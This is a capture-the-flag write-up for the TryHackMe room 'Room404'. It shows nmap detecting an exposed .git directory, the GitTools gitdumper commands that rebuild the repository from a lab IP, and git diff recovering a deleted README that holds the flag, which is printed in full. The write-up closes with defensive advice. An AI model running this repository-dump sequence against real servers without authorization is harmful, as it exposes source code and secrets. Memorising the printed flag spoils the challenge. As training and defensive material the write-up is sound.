# TryHackMe - Room404 Writeup

> **Platform:** TryHackMe
> **Challenge:** Room404
> **Category:** Web Security | Exposed Git Repository | Information Disclosure

---

# Overview

Today we are solving another easy-rated web challenge from TryHackMe named **Room404**.

Unlike traditional web exploitation rooms, this challenge focuses on identifying an exposed development artifact that should never have been accessible from a production environment.

The goal is to investigate the application, discover the security misconfiguration, recover the source code, and identify the leaked flag.

---

# Challenge Scenario

The challenge provides the following description:

> Welcome to the Byte Lotus, where the WiFi is open, the app is free, and the concierge already knows your coffee order. You spend these first days as a guest who simply notices things — a room that isn't on the floor plan, packets that leave every night at the same hour, a profile assembled from two breakfasts and a livestream.

> The Byte Lotus guest-experience platform went live in a hurry, and the night-shift developer shipped more than the website.

The challenge immediately hints that something extra was deployed to production.

Rather than looking for vulnerabilities in the application itself, we should investigate whether development files were accidentally exposed.

Target:

```
http://10.48.155.122:8080
```

---

# Initial Enumeration

The first step was standard web enumeration.

Directory brute forcing and content discovery were performed using common wordlists.

Despite trying several enumeration techniques, no interesting directories or hidden files were discovered.

Since the web application revealed very little information, the next logical step was to enumerate the service itself.

---

# Service Enumeration

A service and version scan was performed against the target.

```bash
nmap -sC -sV -p 22,8080 10.48.155.122
```

The results revealed:

```text
22/tcp    OpenSSH 9.6p1
8080/tcp  Werkzeug/3.0.1 Python/3.12.3
```

However, the most interesting finding was produced by Nmap's HTTP Git detection script.

```text
http-git:

10.48.155.122:8080/.git/

Git repository found!

Last commit message:

initial Byte Lotus guest platform
```

This immediately indicates that the web server is exposing its **.git** directory.

An exposed Git repository is a serious information disclosure vulnerability because it may allow attackers to recover the application's source code, configuration files, secrets, and historical commits.

---

# Exploiting the Exposed Git Repository

Instead of browsing the `.git` directory manually, we can recover the entire repository using **GitTools**.

Clone the tool:

```bash
git clone https://github.com/internetwache/GitTools.git
```

Navigate to the GitDumper utility.

```bash
cd GitTools/Dumper
```

Recover the repository.

```bash
./gitdumper.sh \
http://10.48.155.122:8080/.git/ \
/tmp/recovered_repo
```

GitDumper successfully downloads the accessible Git objects and reconstructs the repository locally.

After the download completes, the recovered repository can be inspected just like any normal Git project.

---

# Investigating the Repository

Navigate to the recovered repository.

```bash
cd /tmp/recovered_repo
```

Checking the repository status reveals something unusual.

```bash
git status
```

Output:

```text
deleted:

README.md
app.js
index.html
```

The files appear to have been deleted from the current working tree.

Fortunately, Git preserves historical changes.

Instead of looking for the files themselves, we inspect the repository history.

---

# Reviewing Repository Changes

Viewing the differences stored in Git:

```bash
git diff
```

The output reveals the contents of the deleted files.

Inside **README.md**, an interesting comment appears.

```text
# Byte Lotus — Guest Experience Platform

Internal staging repository for the guest app and concierge personalization service.

Do not deploy this folder to production.

Staging flag (remove before launch):

THM{byt3_l0tus_n3v3r_f0rg3ts}
```

The developers intended to remove the staging flag before deployment.

Although the file was deleted, Git retained the historical commit, allowing us to recover the information.

---

# Flag

```text
THM{byt3_l0tus_n3v3r_f0rg3ts}
```

---

# Why Did This Work?

Git is a version control system designed to preserve project history.

Deleting a file from the current version of the application does **not** immediately remove it from previous commits.

If the `.git` directory is accidentally exposed through the web server, attackers can reconstruct the repository and inspect previous versions of files.

In this challenge, the developers removed the staging flag from the project before deployment but mistakenly exposed the entire Git repository, making the deleted information recoverable.

---

# Attack Flow

```text
Target Website
        │
        ▼
Initial Enumeration
        │
        ▼
No Interesting Directories
        │
        ▼
Nmap Service Scan
        │
        ▼
Discover Exposed .git Directory
        │
        ▼
Recover Repository with GitDumper
        │
        ▼
Inspect Git History
        │
        ▼
Recover Deleted Files
        │
        ▼
Extract Staging Flag
```

---

# Vulnerability Identified

* Exposed `.git` repository
* Information disclosure
* Source code disclosure
* Recovery of deleted files from Git history
* Sensitive data left inside version control

---

# Key Takeaways

This challenge highlights one of the most common deployment mistakes in web applications: exposing the `.git` directory to the public.

Many developers assume that deleting sensitive files before deployment is sufficient. However, Git stores every committed version of a project unless its history is rewritten. If the repository becomes publicly accessible, attackers can recover deleted files, credentials, API keys, configuration files, and other sensitive information.

The challenge also demonstrates the importance of service enumeration. Standard directory fuzzing revealed nothing useful, but a simple version scan identified the exposed Git repository through Nmap's built-in detection scripts. Thorough enumeration often uncovers attack paths that content discovery alone may miss.

From a defensive perspective, production servers should never expose version control directories such as `.git`, `.svn`, or `.hg`. These directories should be excluded from deployment or explicitly blocked by the web server to prevent unauthorized access to application history.
